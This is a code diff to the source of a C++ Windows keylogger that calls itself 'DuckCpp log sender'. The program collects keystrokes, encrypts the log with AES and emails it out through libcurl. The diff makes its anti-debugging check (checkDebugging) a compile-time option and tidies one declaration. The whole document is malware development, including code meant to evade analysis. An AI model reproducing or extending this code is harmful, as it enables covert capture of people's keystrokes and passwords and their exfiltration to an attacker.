@@ -1,4 +1,5 @@
 #define WIN32_LEAN_AND_MEAN
+#define SHUTDOWN_IF_DEBUGGER_DETECTED
 
 #pragma comment(lib, "ws2_32.lib")  //WinSocks2
 #pragma comment(lib, "wldap32.lib")
@@ -50,7 +51,7 @@ string header = "To: " + repicient + "\r\n" +
 "From: " + login + " (DuckCpp log sender)\r\n" +
 "Subject: Log\r\n\r\n";
 WorkMode mode = trySendEmail ? WorkMode::sendLogEmail : WorkMode::writeLogFile;
-struct curl_slist* recipients = NULL;
+curl_slist* recipients = NULL;
 vector<unsigned char> key;
 AES aes(256);
 
@@ -72,7 +73,10 @@ int APIENTRY _tWinMain(HINSTANCE This, HINSTANCE Prev, LPTSTR cmd, int mode)
 	keyLog.reserve(256);
 	if(trySendEmail)
 		recipients = curl_slist_append(recipients, repicient.c_str());
+
+	#ifdef SHUTDOWN_IF_DEBUGGER_DETECTED
 	checkDebugging();
+	#endif
 
 	//Init encryption
 	if (encryptLogs)
@@ -168,7 +172,10 @@ VOID CALLBACK TimerCallback(HWND, UINT, UINT idTimer, DWORD dwTime)
 
 void processLog()
 {
+	#ifdef SHUTDOWN_IF_DEBUGGER_DETECTED
 	checkDebugging();
+	#endif
+
 	if (keyLog.empty())
 		return;
 	if (encryptLogs)
